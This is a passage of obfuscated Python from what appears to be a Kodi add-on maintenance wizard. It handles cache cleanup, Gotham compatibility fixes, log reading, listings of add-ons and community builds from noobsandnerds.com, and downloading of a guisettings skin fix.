 if os . path . exists ( oO0Oo ) :
  shutil . rmtree ( oO0Oo )
 i1iii1IiiiI1i1 = [ ]
 IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
 I111iiiii1 = "Creating full backup of existing build"
 OOOOoO = "Creating Community Build"
 OO0ooOoOO0OOo = "Archiving..."
 OooOoooo0000 = ""
 I1ii1i11i = "Please Wait"
 if 57 - 57: IIii1I % O00ooooo00 / iiII11i1I1IIi + Ooo00oOo0oOo
 o00Ooo0 ( Oo0o0000o0o0 , myfullbackup , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
 if 95 - 95: oooOooOOo0OO
def i11ii ( ) :
 IiI111I = 0
 oo0oO0 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
 ii1i1Iii = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Localuseraccountnamental' )
 IIII11111Ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 IiiiII = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 OoOoo00Oo0OoO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 o0o0oOOO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 OOooo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 IIII = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 o0o0OOo0OOoO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 O0ooO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 i1Ii1IiiIi1II = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
 I1iI1I1ii1 = os . path . join ( Oo0o0000o0o0 , 'temp' )
 I11 . create ( 'Calculating Used Space' , '' , 'Please wait' , '' )
 if 54 - 54: IIIIiiII111 % O00ooooo00
 if 51 - 51: IIii1I - o000O0o
 if os . path . exists ( oo0oO0 ) :
  IiI111I = Oo0 ( oo0oO0 , IiI111I )
 if os . path . exists ( ii1i1Iii ) :
  IiI111I = Oo0 ( ii1i1Iii , IiI111I )
 if os . path . exists ( IIII11111Ii ) :
  IiI111I = Oo0 ( IIII11111Ii , IiI111I )
 if os . path . exists ( IiiiII ) :
  IiI111I = Oo0 ( IiiiII , IiI111I )
 if os . path . exists ( OoOoo00Oo0OoO ) :
  IiI111I = Oo0 ( OoOoo00Oo0OoO , IiI111I )
 if os . path . exists ( o0o0oOOO ) :
  IiI111I = Oo0 ( o0o0oOOO , IiI111I )
 if os . path . exists ( OOooo ) :
  IiI111I = Oo0 ( OOooo , IiI111I )
 if os . path . exists ( IIII ) :
  IiI111I = Oo0 ( IIII , IiI111I )
 if os . path . exists ( o0o0OOo0OOoO ) :
  IiI111I = Oo0 ( o0o0OOo0OOoO , IiI111I )
 if os . path . exists ( O0ooO ) :
  IiI111I = Oo0 ( O0ooO , IiI111I )
 if os . path . exists ( i1Ii1IiiIi1II ) :
  IiI111I = Oo0 ( i1Ii1IiiIi1II , IiI111I )
 if os . path . exists ( I1iI1I1ii1 ) :
  IiI111I = Oo0 ( I1iI1I1ii1 , IiI111I )
 IiI111I = Oo0 ( oooOOOOO , IiI111I )
 IiI111I = Oo0 ( I11i1I1I , IiI111I ) / 1000000
 oO000o0Oo00 = i11 . yesno ( 'Results' , 'You can free up [COLOR=dodgerblue]' + str ( IiI111I ) + 'MB[/COLOR] of space if you run this cleanup program. Would you like to run the cleanup procedure?' )
 if oO000o0Oo00 == 1 :
  Ii1ooOO0OOO00o ( )
  try :
   shutil . rmtree ( I11i1I1I )
  except :
   pass
  oO000o0Oo00 = i11 . yesno ( 'Thumbnail Cleanup' , 'We highly recommend only wiping your OLD unused thumbnails. Do you want to clear just the old ones or all thumbnails?' , yeslabel = 'ALL' , nolabel = 'OLD ONLY' )
  if oO000o0Oo00 == 1 :
   Oo00O00o0 ( )
   o0I1IiiiiI1i1I ( oooOOOOO )
   IiII1 ( )
  else :
   i1Ii11ii1I ( )
   if 45 - 45: o0oo + o0oo % i11Iii
   if 36 - 36: IIIIiiII111 * o0o . o0o / iiII11i1I1IIi / o000O0o
def oooO0ooo ( url ) :
 OOo0oO00ooO00 ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , '' , '' , '' , '' )
 if 48 - 48: i11Iii + II11iIiIIIiI . OoOo0o % Ooo00oOo0oOo + oooOooOOo0OO
 if I1IiiI . getSetting ( 'adult' ) == 'true' :
  OOo0oO00ooO00 ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , '' , '' , '' , '' )
  if 38 - 38: oooOooOOo0OO
  if 28 - 28: IIii1I * o0o . o000O0o
def Oo0 ( path , size ) :
 for oooiI1i , o0Ii11I1iIIi , O0ooOiI in os . walk ( path ) :
  for Oo0oO00 in O0ooOiI :
   I11 . update ( 0 , "Calulating..." , '[COLOR=dodgerblue]' + Oo0oO00 + '[/COLOR]' , 'Please Wait' )
   OOI1III1I11I1 = os . path . join ( oooiI1i , Oo0oO00 )
   size += os . path . getsize ( OOI1III1I11I1 )
 return size
 if 85 - 85: OoOo0o
def oO0ooo00o0o000Oo ( default = "" , heading = "" , hidden = False ) :
 O0OoO00OoOO = xbmc . Keyboard ( default , heading , hidden )
 O0OoO00OoOO . doModal ( )
 if ( O0OoO00OoOO . isConfirmed ( ) ) :
  return unicode ( O0OoO00OoOO . getText ( ) , "utf-8" )
 return default
 if 53 - 53: o0oo % oOoO0o00OO0 . ooo0O0O00 . O00ooooo00 . o0oo
def iiII1II11i ( ) :
 import traceback
 if 78 - 78: i11iIiiIii / oooOooOOo0OO
 O0oooooO = traceback . print_exc ( )
 xbmc . log ( '### ERROR STRING: %s' % O0oooooO )
 if 28 - 28: iiII11i1I1IIi / Oo00oo0oO . ooo0O0O00 + o0oo + o0o % iiII11i1I1IIi
 if 45 - 45: iiII11i1I1IIi / OOO0O0O0ooooo % II1
def Oo0 ( path , size ) :
 for oooiI1i , o0Ii11I1iIIi , O0ooOiI in os . walk ( path ) :
  for Oo0oO00 in O0ooOiI :
   I11 . update ( 0 , "Calculating..." , '[COLOR=dodgerblue]' + Oo0oO00 + '[/COLOR]' , 'Please Wait' )
   OOI1III1I11I1 = os . path . join ( oooiI1i , Oo0oO00 )
   size += os . path . getsize ( OOI1III1I11I1 )
 return size
 if 92 - 92: IIIIiiII111 . Iii . o0o - II1 / i11Iii
 if 80 - 80: IIii1I / i11iIiiIii + ooo0O0O00
def I11I1i ( ) :
 oOO0oOooo = [ ]
 o00IIIIii1111i1 = sys . argv [ 2 ]
 if len ( o00IIIIii1111i1 ) >= 2 :
  iiI1ii1 = sys . argv [ 2 ]
  I1oOOoo0 = iiI1ii1 . replace ( '?' , '' )
  if ( iiI1ii1 [ len ( iiI1ii1 ) - 1 ] == '/' ) :
   iiI1ii1 = iiI1ii1 [ 0 : len ( iiI1ii1 ) - 2 ]
  II1OOO = I1oOOoo0 . split ( '&' )
  oOO0oOooo = { }
  for iiIII1I11iii in range ( len ( II1OOO ) ) :
   ooIii = { }
   ooIii = II1OOO [ iiIII1I11iii ] . split ( '=' )
   if ( len ( ooIii ) ) == 2 :
    oOO0oOooo [ ooIii [ 0 ] ] = ooIii [ 1 ]
    if 66 - 66: II11iIiIIIiI * o0ii1I
 return oOO0oOooo
 if 58 - 58: IIii1I % II11iIiIIIiI + OoOo0o - OoOo0o . i11iIiiIii + II1
def i1iIII1IIi ( ) :
 oOOo0 = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 I11 = xbmcgui . DialogProgress ( )
 I11 . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 if 63 - 63: Ooo00oOo0oOo . OoOo0o % Oo00oo0oO + Ooo00oOo0oOo
 for oooOooooO in glob . glob ( os . path . join ( oOOo0 , '*.*' ) ) :
  if 81 - 81: II11iIiIIIiI - o000O0o % o0ii1I
  for file in glob . glob ( os . path . join ( oooOooooO , '*.*' ) ) :
   if 7 - 7: i11Iii - O00ooooo00 . Iii
   if 'addon.xml' in file :
    I11 . update ( 0 , "Fixing" , file , 'Please Wait' )
    Ii11iiI1 = open ( file ) . read ( )
    i1I1IIIiii1 = Ii11iiI1 . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    Oo0oO00 = open ( file , mode = 'w' )
    Oo0oO00 . write ( str ( i1I1IIIiii1 ) )
    Oo0oO00 . close ( )
    if 12 - 12: Oo00oo0oO / o0oo / OOO0O0O0ooooo * Oo00oo0oO
 i11 = xbmcgui . Dialog ( )
 i11 . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the relevant support forum." )
 if 51 - 51: i11Iii * ooo0O0O00 / O00ooooo00
def IIi1I1iIIiiII11i1I1 ( ) :
 if i11 . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' ) :
  i1iIII1IIi ( )
  if 28 - 28: Ooo00oOo0oOo * i11Iii * Iii * OoOo0o . Ooo00oOo0oOo . oOoO0o00OO0
  if 32 - 32: i11Iii - o0oo . ooo0O0O00 . ooo0O0O00 % O00ooooo00 * IIIIiiII111
def IIiI1i ( ) :
 i11I = 0
 o0o0I11 = os . listdir ( I1IIiiIiii )
 for O0oO0 in o0o0I11 :
  if O0oO0 . endswith ( '.log' ) and not O0oO0 . endswith ( '.old.log' ) :
   mylog = os . path . join ( I1IIiiIiii , O0oO0 )
   lastmodified = os . path . getmtime ( mylog )
   if lastmodified > i11I :
    i11I = lastmodified
    logfile = mylog
    if 16 - 16: IIIIiiII111 % IIii1I . o000O0o
 IIii1Ii = open ( logfile , 'r' )
 Oo0O0o = IIii1Ii . read ( )
 IIii1Ii . close ( )
 return Oo0O0o
 if 47 - 47: II11iIiIIIiI * IIIIiiII111 % IIii1I / i11Iii
 if 61 - 61: Oo00oo0oO + ooo0O0O00 - o0oo * oooOooOOo0OO
def oooOO00oo0 ( url ) :
 if I1IiiI . getSetting ( 'adult' ) == 'true' :
  oOO00o0O0 = 'yes'
  if 25 - 25: II11iIiIIIiI - IIIIiiII111 . o0o
 else :
  oOO00o0O0 = 'no'
  if 57 - 57: o0ii1I + iiII11i1I1IIi * oOoO0o00OO0 - i11Iii % IIii1I - IIIIiiII111
 if url == 'popular' :
  III1I11II11I = 'http://noobsandnerds.com/TI/AddonPortal/popular_new.php?adult=%s' % ( oOO00o0O0 )
 elif url == 'latest' :
  III1I11II11I = 'http://noobsandnerds.com/TI/AddonPortal/latest_new.php?adult=%s' % ( oOO00o0O0 )
 elif url != 'popular' and url != 'latest' :
  III1I11II11I = 'http://noobsandnerds.com/TI/AddonPortal/sortby_new.php?sortx=name&user=%s&adult=%s&%s' % ( Oo , oOO00o0O0 , url )
  xbmc . log ( III1I11II11I )
  if not "desc" in url :
   url = url + '&desc='
  if not "genre" in url :
   url = url + '&genre='
 print "URL: " + III1I11II11I
 if 78 - 78: oOoO0o00OO0 . OoOo0o . OoOo0o . o0o % ooo0O0O00
 Ii1iI111II1I1 = oOOOOoOO0o ( III1I11II11I , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 26 - 26: i11Iii + o0oo / Iii . Ooo00oOo0oOo * IIIIiiII111
 if 21 - 21: o000O0o - o000O0o + ooo0O0O00 % o000O0o * oooOooOOo0OO
 O0OO0O = re . compile ( 'name="(.+?)"  <br> downloads="(.+?)"  <br> icon="(.+?)"  <br> broken="(.+?)"  <br> id="(.+?)"  <br> UID="(.+?)"  <br>' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
 if O0OO0O == [ ] :
  if 74 - 74: ooo0O0O00 / o0o . o000O0o - II1 + Ooo00oOo0oOo + o0o
  O0OO0O = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> broken="(.+?)" <br> id="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
  if 36 - 36: IIIIiiII111 * o000O0o * oOoO0o00OO0 . o0o * oOoO0o00OO0
 if O0OO0O != [ ] and url != 'popular' and url != 'latest' :
  O0ooO0 ( III1I11II11I , 'addons' )
  if 41 - 41: o0ii1I % iiII11i1I1IIi
  for OOo0 , ooo0O , IiI11i1IIiiI , iii11i1IIII , o00oOo0OoO0oO , OoOoiI in O0OO0O :
   try :
    xbmcaddon . Addon ( id = o00oOo0OoO0oO ) . getAddonInfo ( 'path' )
    oOO0OO00 = '[COLOR=lime][INSTALLED][/COLOR] '
   except :
    oOO0OO00 = ''
    if 75 - 75: ooo0O0O00 * iiII11i1I1IIi / OoOo0o * iiII11i1I1IIi / i11Iii
   if iii11i1IIII == '0' :
    OOo0oO00ooO00 ( 'addonfolder' , oOO0OO00 + OOo0 + ' [' + ooo0O + ' downloads]' , OoOoiI , 'addon_final_menu' , IiI11i1IIiiI , '' , '' )
    if 14 - 14: O00ooooo00 * IIii1I - IIIIiiII111 * Iii - ooo0O0O00 / oooOooOOo0OO
   if iii11i1IIII == '1' :
    OOo0oO00ooO00 ( 'addonfolder' , oOO0OO00 + '[COLOR=red]' + OOo0 + ' [REPORTED AS BROKEN][/COLOR]' , OoOoiI , 'addon_final_menu' , IiI11i1IIiiI , '' , '' )
    if 73 - 73: oOoO0o00OO0 - Iii * OOO0O0O0ooooo - Iii - o0oo
 elif O0OO0O != [ ] and ( url == 'popular' or url == 'latest' ) :
  for OOo0 , ooo0O , IiI11i1IIiiI , iii11i1IIII , o00oOo0OoO0oO , OoOoiI in O0OO0O :
   try :
    xbmcaddon . Addon ( id = o00oOo0OoO0oO ) . getAddonInfo ( 'path' )
    oOO0OO00 = '[COLOR=lime][INSTALLED][/COLOR] '
   except :
    oOO0OO00 = ''
    if 96 - 96: oOoO0o00OO0 - OOO0O0O0ooooo
   if iii11i1IIII == '0' :
    OOo0oO00ooO00 ( 'addonfolder' , oOO0OO00 + OOo0 + ' [' + ooo0O + ' downloads]' , OoOoiI , 'addon_final_menu' , IiI11i1IIiiI , '' , '' )
    if 35 - 35: II11iIiIIIiI . o0o . OoOo0o - o0o % o0o + OoOo0o
   if iii11i1IIII == '1' :
    OOo0oO00ooO00 ( 'addonfolder' , oOO0OO00 + '[COLOR=red]' + OOo0 + ' [REPORTED AS BROKEN][/COLOR]' , OoOoiI , 'addon_final_menu' , IiI11i1IIiiI , '' , '' )
    if 99 - 99: o0ii1I + II11iIiIIIiI
 elif '&redirect' in url :
  oO000o0Oo00 = i11 . yesno ( 'No Content Found' , 'This add-on cannot be found on the Add-on Portal.' , '' , 'Would you like to remove this item from your setup?' )
  if 34 - 34: OoOo0o * o0ii1I . o000O0o % i11iIiiIii
  if oO000o0Oo00 == 1 :
   print "### Need to add remove function to code still"
   if 61 - 61: IIii1I + oooOooOOo0OO * o0o - O00ooooo00 % oooOooOOo0OO
 else :
  i11 . ok ( 'No Content Found' , 'Sorry no content can be found that matches' , 'your search criteria.' , '' )
  if 76 - 76: oooOooOOo0OO / Iii
  if 12 - 12: OoOo0o
def OO0oOo ( url ) :
 if zip == '' :
  i11 . ok ( 'Storage/Download Folder Not Set' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  I1IiiI . openSettings ( sys . argv [ 0 ] )
  if 36 - 36: Iii * o0oo / i11Iii / o000O0o - IIIIiiII111
 if I1IiiI . getSetting ( 'adult' ) == 'true' :
  oOO00o0O0 = ''
  if 53 - 53: oooOooOOo0OO
 else :
  oOO00o0O0 = 'no'
  if 99 - 99: iiII11i1I1IIi
 if 'genre' in url :
  III1I11II11I = 'http://noobsandnerds.com/TI/Community_Builds/sort_by_test.php?sortx=name&orderx=ASC&adult=%s&%s' % ( oOO00o0O0 , url )
 else :
  III1I11II11I = 'http://noobsandnerds.com/TI/Community_Builds/sort_by_test.php?sortx=name&orderx=ASC&genre=&adult=%s&%s' % ( oOO00o0O0 , url )
 if IiII == 'true' :
  xbmc . log ( "BUILD URL: %s" % III1I11II11I )
 Ii1iI111II1I1 = oOOOOoOO0o ( III1I11II11I , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 17 - 17: i11iIiiIii - i11iIiiIii + oOoO0o00OO0 * i11Iii * oooOooOOo0OO / II1
 O0OO0O = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> Thumbnail="(.+?)"  <br> Fanart="(.+?)"  <br> downloads="(.+?)"  <br> <br>' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
 if O0OO0O == [ ] :
  if 22 - 22: OoOo0o * oOoO0o00OO0 - Oo00oo0oO
  O0OO0O = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
 if not '&visibility=private' in url :
  O0ooO0 ( url , 'communitybuilds' )
  if 71 - 71: IIii1I / i11iIiiIii % o0ii1I . OoOo0o * o000O0o % Ooo00oOo0oOo
 for OOo0 , id , i1II1111 , ooOOOo0 , ooo0O in O0OO0O :
  o0O00o ( OOo0 + '[COLOR=lime] (' + ooo0O + ' downloads)[/COLOR]' , id + url , 'community_menu' , i1II1111 , ooOOOo0 , id , '' , '' , '' , '' )
  if 19 - 19: OoOo0o + ooo0O0O00 * OoOo0o
 if 'id=1' in url : III1I11II11I = O0oo0OO0
 if 'id=2' in url : III1I11II11I = iiIIIII1i1iI
 if 'id=3' in url : III1I11II11I = oo00
 if 'id=4' in url : III1I11II11I = Oo0oO0ooo
 if 'id=5' in url : III1I11II11I = i1
 if 71 - 71: o0ii1I . o000O0o - oOoO0o00OO0 - iiII11i1I1IIi - O00ooooo00 - o000O0o
 Ii1iI111II1I1 = oOOOOoOO0o ( III1I11II11I , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0OO0O = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 if 45 - 45: o0oo * o0oo
 for OOo0 , url , o00oOOoO0oO , oOOoO0OOoOoO , OOO0oOoO0O in O0OO0O :
  if not 'viewport' in OOo0 :
   OOo0oO00ooO00 ( 'addon' , OOo0 , url , 'restore_local_CB' , o00oOOoO0oO , oOOoO0OOoOoO , OOO0oOoO0O , '' )
   if 9 - 9: IIii1I
   if 57 - 57: i11Iii / IIIIiiII111 % o0ii1I % i11iIiiIii
def IIiI1i ( file = False , old = False ) :
 i11I = 0
 o0o0I11 = os . listdir ( I1IIiiIiii )
 o0OO0Oooo = [ ]
 if 97 - 97: ooo0O0O00
 for O0oO0 in o0o0I11 :
  if old == True and O0oO0 . endswith ( '.old.log' ) : o0OO0Oooo . append ( os . path . join ( I1IIiiIiii , O0oO0 ) )
  elif old == False and O0oO0 . endswith ( '.log' ) and not O0oO0 . endswith ( '.old.log' ) : o0OO0Oooo . append ( os . path . join ( I1IIiiIiii , O0oO0 ) )
  if 88 - 88: II1 - II11iIiIIIiI + OOO0O0O0ooooo * Oo00oo0oO * o0o
 if len ( o0OO0Oooo ) > 0 :
  o0OO0Oooo . sort ( key = lambda Oo0oO00 : os . path . getmtime ( Oo0oO00 ) )
  if file == True : return o0OO0Oooo [ - 1 ]
  else :
   IIii1Ii = open ( o0OO0Oooo [ - 1 ] , 'r' )
   Oo0O0o = IIii1Ii . read ( )
   IIii1Ii . close ( )
   return Oo0O0o
 else :
  return False
  if 8 - 8: oooOooOOo0OO / i11iIiiIii
  if 93 - 93: OoOo0o % i11iIiiIii
def I111I1iii11 ( url , local ) :
 oooOo ( )
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( OOo0 , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 43 - 43: oooOooOOo0OO * Oo00oo0oO / Ooo00oOo0oOo % II11iIiIIIiI
 if oO000o0Oo00 == 1 :
  i11II ( url , local )
  if 63 - 63: o0oo % O00ooooo00 - oooOooOOo0OO
def Iii1i11 ( path ) :
 if 40 - 40: oOoO0o00OO0 / IIii1I . Oo00oo0oO % i11Iii
 IIIIIiI11Ii = open ( iiI1IiI , mode = 'r' )
 oOo0O = IIIIIiI11Ii . read ( )
 IIIIIiI11Ii . close ( )
 if 56 - 56: i11Iii . IIii1I + O00ooooo00
 o0oOOoOo00o = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOo0O )
 i1I11IiI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOo0O )
 iiiiI = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOo0O )
 IiO0o = o0oOOoOo00o [ 0 ] if ( len ( o0oOOoOo00o ) > 0 ) else ''
 oOo0Oooo = i1I11IiI [ 0 ] if ( len ( i1I11IiI ) > 0 ) else ''
 I1iiIIiI11I = iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else ''
 if 29 - 29: o0o + oooOooOOo0OO % i11Iii + Iii
 if 92 - 92: o0ii1I
 oo0O = open ( path , mode = 'r' )
 Iii1iI1iiIii = oo0O . read ( )
 oo0O . close ( )
 if 37 - 37: oooOooOOo0OO
 I1Ii1iI1IiI1I = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( Iii1iI1iiIii )
 o0OOOoO = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( Iii1iI1iiIii )
 ooo0OO0OOoooOo00 = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( Iii1iI1iiIii )
 oOoO = I1Ii1iI1IiI1I [ 0 ] if ( len ( I1Ii1iI1IiI1I ) > 0 ) else ''
 o0O0o0O = o0OOOoO [ 0 ] if ( len ( o0OOOoO ) > 0 ) else ''
 iiII1i1i1I1 = ooo0OO0OOoooOo00 [ 0 ] if ( len ( ooo0OO0OOoooOo00 ) > 0 ) else ''
 iIIIiIi = oOo0O . replace ( IiO0o , oOoO ) . replace ( I1iiIIiI11I , iiII1i1i1I1 ) . replace ( oOo0Oooo , o0O0o0O )
 if 88 - 88: OOO0O0O0ooooo % Oo00oo0oO . Oo00oo0oO . OoOo0o / O00ooooo00
 print "### Attempting to create new guisettings at: " + path
 oo0O0 = open ( path , mode = 'w+' )
 oo0O0 . write ( str ( iIIIiIi ) )
 oo0O0 . close ( )
 if 16 - 16: iiII11i1I1IIi * OoOo0o
 if 59 - 59: o0o + IIii1I / OoOo0o - o0oo . o0ii1I
def i11II ( url , local ) :
 OO0OooOo = False
 oO0000Oo = 0
 IIIi11Ii111I1 = 1
 if 99 - 99: IIii1I . iiII11i1I1IIi / i11Iii . II11iIiIIIiI % o000O0o * o0o
 if os . path . exists ( i1I1iI ) :
  os . remove ( i1I1iI )
  if 95 - 95: oooOooOOo0OO
 if os . path . exists ( II ) :
  os . remove ( II )
  if 80 - 80: Oo00oo0oO
 if os . path . exists ( Oo00OOOOO ) :
  os . remove ( Oo00OOOOO )
  if 42 - 42: II1 * Ooo00oOo0oOo
 if not os . path . exists ( oo0OooOOo0 ) :
  os . makedirs ( oo0OooOOo0 )
  if 53 - 53: OoOo0o + O00ooooo00 . o0oo / i11iIiiIii + IIIIiiII111 % Iii
  if 9 - 9: i11Iii . o0o - iiII11i1I1IIi . OoOo0o
 try :
  shutil . copyfile ( iiI1IiI , i1I1iI )
  if 39 - 39: II11iIiIIIiI
 except :
  print "No guisettings found, most likely due to a previously failed attempt at install"
  if 70 - 70: Oo00oo0oO % o0oo % o000O0o
 if local != 1 :
  OOo00oOo = os . path . join ( I11i1 , 'guifix.zip' )
  if 51 - 51: ooo0O0O00
  try :
   I11 . create ( 'Downloading Skin Fix' , '' , '' , '' )
   downloader . download ( url , OOo00oOo )
  except :
   print "Failed to download guisettings"
 else :
  OOo00oOo = xbmc . translatePath ( url )
 if IiII == 'true' :
  print "### lib=" + OOo00oOo
  if 81 - 81: OOO0O0O0ooooo
 i11ii11IiI1 = str ( os . path . getsize ( OOo00oOo ) )
 I11 . create ( "Installing Skin Fix" , "Checking " , '' , 'Please Wait' )
 if 47 - 47: IIii1I % o0o . o0o / OOO0O0O0ooooo . i11iIiiIii * IIIIiiII111
 extract . all ( OOo00oOo , oo0OooOOo0 )
 if 24 - 24: OOO0O0O0ooooo
 if os . path . exists ( os . path . join ( oo0OooOOo0 , 'script.skinshortcuts' ) ) :
  try :
   shutil . rmtree ( os . path . join ( oo0o0O00 , 'script.skinshortcuts' ) )
  except :
   pass
  os . rename ( os . path . join ( oo0OooOOo0 , 'script.skinshortcuts' ) , os . path . join ( oo0o0O00 , 'script.skinshortcuts' ) )
  if 33 - 33: II1 + oooOooOOo0OO * Ooo00oOo0oOo / II11iIiIIIiI
 if os . path . exists ( os . path . join ( oo0OooOOo0 , 'addon_data' ) ) :
  oooo ( os . path . join ( oo0OooOOo0 , 'addon_data' ) , oOo0oooo00o , 1 )
  if 15 - 15: II11iIiIIIiI * OOO0O0O0ooooo % o000O0o / i11Iii
 if local != 'library' or local != 'updatelibrary' or local != 'fresh' :
  if 17 - 17: oooOooOOo0OO - Ooo00oOo0oOo - ooo0O0O00 + o0o
  try :
   o0o0O0O00oOOo = open ( os . path . join ( oo0OooOOo0 , 'profiles.xml' ) , mode = 'r' )
   Oo0ooO0O0o00o = o0o0O0O00oOOo . read ( )
   o0o0O0O00oOOo . close ( )
   if 75 - 75: oOoO0o00OO0
   if os . path . exists ( os . path . join ( oo0OooOOo0 , 'profiles.xml' ) ) :
    if 92 - 92: II11iIiIIIiI % Ooo00oOo0oOo . ooo0O0O00
    if local == None :
